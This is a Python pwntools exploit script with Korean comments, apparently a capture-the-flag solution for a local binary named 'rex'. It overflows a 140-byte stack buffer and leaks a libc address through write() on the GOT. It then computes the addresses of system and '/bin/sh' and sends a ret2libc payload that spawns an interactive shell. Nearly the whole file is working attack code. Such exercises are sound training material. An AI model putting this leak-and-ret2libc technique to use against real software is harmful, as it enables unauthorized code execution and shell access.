#! -*- coding: utf-8 -*-
from pwn import * 

p = process("./rex")

# 심볼 strip 된 바이너리. nx 제외한 보호기법 다 꺼져있음. 
# 0x80483f4 위치에서 함수 하나 호출, 0x8048416 에서 read 함수 호출 , 0x100 바이트 입력.
# 스택 위치 0xffffd440 , ret 0xffffd4cc , 0x8c(140)바이트 거리. 
# 공격 순서 : leak + rop . write 함수 통해 라이브러리 주소 leak 후 binsh 주소값 계산.
# 마찬가지로, system 함수의 주소도 leak한 값을 이용해 계산하여 풀이. 
# 따라서 read 함수를 대신 사용함. 
# 거의 rtl 방식으로 풀이한듯 함. 

bin_offset = 0x17B8CF
write_offset = 0xe56f0
read_offset = 0xe5620
system_offset =  0x3cd10

write_plt = 0x804830c
write_got = 0x8049614


read_got = 0x804961c
main = 0x804841d


payload = "a"*140 
#payload += "b"*4 
payload += p32(write_plt) + p32(0x804841d) + p32(1) + p32(read_got) + p32(4)
# write(1,got,4)
p.send("")
p.sendline(payload)

#print p.recvline()
rcv = u32(p.recv(8))
libc = rcv - read_offset
bin = libc+bin_offset
system = libc+system_offset
log.info("bin : "+hex(bin))

payload2 = "b"*140
# system("/bin/sh")
payload2 += p32(system) + "dddd" + p32(bin)
pause()
p.sendline(payload2)

p.interactive()